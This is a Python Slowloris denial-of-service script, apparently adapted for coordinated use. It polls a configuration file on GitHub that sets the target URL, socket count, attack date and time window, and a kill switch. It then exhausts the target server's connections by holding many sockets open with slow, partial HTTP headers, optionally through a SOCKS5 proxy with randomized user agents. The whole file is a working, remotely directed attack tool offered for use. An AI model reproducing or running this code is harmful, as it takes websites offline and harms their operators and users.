#!/usr/bin/env python3

import urllib.request
import configparser
import socket
import sys
import argparse
import logging
import random
import time
from datetime import datetime, timezone

CONF_URL = "https://github.com/NiuGoodResignation/slowloris/raw/refs/heads/master/niubo.conf"
#CONF_URL = "http://localhost/niubo.conf"

def descargar_conf(url: str) -> str:
    """Descarga el fichero de configuración y devuelve su contenido como texto."""
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            return resp.read().decode("utf-8")
    except Exception as e:
        print(f"[ERROR] No se pudo descargar {url}: {e}")
        return None


def parsear_conf(texto: str) -> configparser.ConfigParser:
    """Parsea el texto INI y devuelve el objeto ConfigParser."""
    cfg = configparser.ConfigParser()
    cfg.read_string(texto)
    return cfg


def en_ventana_temporal(date: str, timei: str, timee: str) -> bool:
    """
    Comprueba si el instante UTC actual está dentro del día 'date'
    y entre 'timei' (inclusive) y 'timee' (inclusive).
    """
    ahora_utc = datetime.now(timezone.utc)

    fecha      = datetime.strptime(date,  "%Y-%m-%d").date()
    hora_ini   = datetime.strptime(timei, "%H:%M").time()
    hora_fin   = datetime.strptime(timee, "%H:%M").time()

    if ahora_utc.date() != fecha:
        return False

    hora_actual = ahora_utc.time().replace(second=0, microsecond=0)
    return hora_ini <= hora_actual <= hora_fin

parser = argparse.ArgumentParser(
    description="Slowloris, low bandwidth stress test tool for websites"
)
parser.add_argument("host", nargs="?", help="Host to perform stress test on")
parser.add_argument(
    "-p", "--port", default=443, help="Port of webserver, usually 80", type=int
)
parser.add_argument(
    "-s",
    "--sockets",
    default=150,
    help="Number of sockets to use in the test",
    type=int,
)
parser.add_argument(
    "-v",
    "--verbose",
    dest="verbose",
    action="store_true",
    help="Increases logging",
)
parser.add_argument(
    "-ua",
    "--randuseragents",
    dest="randuseragent",
    action="store_true",
    help="Randomizes user-agents with each request",
)
parser.add_argument(
    "-x",
    "--useproxy",
    dest="useproxy",
    action="store_true",
    help="Use a SOCKS5 proxy for connecting",
)
parser.add_argument(
    "--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host"
)
parser.add_argument(
    "--proxy-port", default="8080", help="SOCKS5 proxy port", type=int
)
parser.add_argument(
    "--https",
    dest="https",
    action="store_true",
    help="Use HTTPS for the requests",
)
parser.add_argument(
    "--sleeptime",
    dest="sleeptime",
    default=15,
    type=int,
    help="Time to sleep between each header sent.",
)
parser.set_defaults(verbose=False)
parser.set_defaults(randuseragent=True)
parser.set_defaults(useproxy=False)
parser.set_defaults(https=True)
args = parser.parse_args()

if args.useproxy:
    # Tries to import to external "socks" library
    # and monkey patches socket.socket to connect over
    # the proxy by default
    try:
        import socks

        socks.setdefaultproxy(
            socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port
        )
        socket.socket = socks.socksocket
        logging.info("Using SOCKS5 proxy for connecting...")
    except ImportError:
        logging.error("Socks Proxy Library Not Available!")
        logging.info("ERROR, no pot continuar.")
        sys.exit(1)

logging.basicConfig(
    format="[%(asctime)s] %(message)s",
    datefmt="%d-%m-%Y %H:%M:%S",
    level=logging.DEBUG if args.verbose else logging.INFO,
)


def send_line(self, line):
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))


def send_header(self, name, value):
    self.send_line(f"{name}: {value}")


if args.https:
    logging.info("Importing ssl module")
    import ssl

    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)

list_of_sockets = []
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)


def init_socket(ip: str):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    if args.https:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=args.host)

    s.connect((ip, args.port))

    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")

    ua = user_agents[0]
    if args.randuseragent:
        ua = random.choice(user_agents)

    s.send_header("User-Agent", ua)
    s.send_header("Accept-language", "en-US,en,q=0.5")
    return s


def slowloris_iteration():
    logging.info("Sending keep-alive headers...")
    logging.info("Socket count: %s", len(list_of_sockets))

    # Try to send a header line to each socket
    for s in list(list_of_sockets):
        try:
            s.send_header("X-a", random.randint(1, 5000))
        except socket.error:
            list_of_sockets.remove(s)

    # Some of the sockets may have been closed due to errors or timeouts.
    # Re-create new sockets to replace them until we reach the desired number.

    diff = args.sockets - len(list_of_sockets)
    if diff < 0:
        logging.info("Deleting %s sockets...", -diff)
        for s in list(list_of_sockets[diff:]):
            list_of_sockets.remove(s)
        return

    logging.info("Creating %s new sockets...", diff)
    for _ in range(diff):
        try:
            s = init_socket(args.host)
            if not s:
                continue
            list_of_sockets.append(s)
        except socket.error as e:
            logging.debug("Failed to create new socket: %s", e)
            break

def config():
    # ── 1. Descargar fichero ────────────────────────────────────────────────
    print(f"[INFO] Descarregant configuració des de {CONF_URL} …")
    texto = descargar_conf(CONF_URL)
    if not bool(texto): return None, False
    print("[INFO] Fitxer descarregat correctament.\n")

    # ── 2. Parsear y asignar variables ──────────────────────────────────────
    cfg = parsear_conf(texto)

    date  = cfg.get("when",   "date")
    timei = cfg.get("when",   "timei")
    timee = cfg.get("when",   "timee")
    off = int(cfg.get("when",   "off"))
    url   = cfg.get("target", "url")
    args.sockets = int(cfg.get("target",   "sockets"))
    args.sleeptime = int(cfg.get("target", "sleeptime"))
    
    if off==1:
        print(f"[INFO] Acció desactivada. Res a fer de moment. Espera noves instruccions.")
        sys.exit(0)

    print(f"  date  = {date}")
    print(f"  timei = {timei}")
    print(f"  timee = {timee}")
    print(f"  url   = {url}\n")

    # ── 3. Comprobar ventana temporal (UTC) ─────────────────────────────────
    ahora_utc = datetime.now(timezone.utc)
    print(f"[INFO] Hora UTC actual: {ahora_utc.strftime('%Y-%m-%d %H:%M')} UTC")

    if not en_ventana_temporal(date, timei, timee):
        print(f"[INFO] Fora de la finestra temporal "
              f"({date} {timei}–{timee} UTC). En espera...")
        return None, False

    print(f"[OK]   Dins de la finestra temporal ({date} {timei}–{timee} UTC).")
    return url, True

def main():
    url, active = config()
    args.host = url
    ip = args.host
    socket_count = args.sockets
    logging.info("Attacking %s with %s sockets.", ip, socket_count)

    logging.info("Creating sockets...")
    if url and active: 
        for _ in range(socket_count):
            try:
                logging.debug("Creating socket nr %s", _)
                s = init_socket(ip)
            except socket.error as e:
                logging.error("Failed to create socket: %s", e)
                logging.info("ERROR, no pot continuar.")
                sys.exit(1)
            list_of_sockets.append(s)

    while True:
        try:
            if url and active: slowloris_iteration()
            logging.info("Funciona OK.")
            logging.info("Sleeping for %d seconds", args.sleeptime)
            time.sleep(args.sleeptime)
            url, active = config()
            args.host = url
        except (KeyboardInterrupt, SystemExit):
            logging.info("Stopping Slowloris")
            break
        except Exception as e:
            logging.error("Error in Slowloris iteration: %s", e)
            logging.info("ERROR, no pot continuar.")
            sys.exit(1)
        
if __name__ == "__main__":
    main()
